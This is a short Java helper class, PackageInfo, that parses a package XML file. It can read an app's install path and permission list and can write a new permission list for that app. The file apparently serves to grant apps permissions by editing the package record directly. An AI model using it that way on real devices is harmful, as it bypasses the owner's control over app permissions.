package com.android.service.capabilities;

import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;

import javax.xml.parsers.FactoryConfigurationError;
import javax.xml.parsers.ParserConfigurationException;

import org.xml.sax.SAXException;

public class PackageInfo {
	private static final String TAG = "PackageInfo";
	
	private String packageName;
	private FileInputStream fin;
	private XmlParser xml;
	
	// XML da parsare
	public PackageInfo(FileInputStream fin, String packageName) throws SAXException, IOException, ParserConfigurationException, FactoryConfigurationError {
		this.fin = fin;
		this.packageName = packageName;
		
		xml = new XmlParser(this.fin);
	}
	
	public String getPackagePath() {	
		return xml.getPackagePath(this.packageName);
	}
	
	public ArrayList<String> getPackagePermissions() {
		return xml.getPackagePermissions(this.packageName);
	}
	
	public void addPermissions(ArrayList<String> p) {
		xml.setPackagePermissions(this.packageName, p);
		return;
	}
}
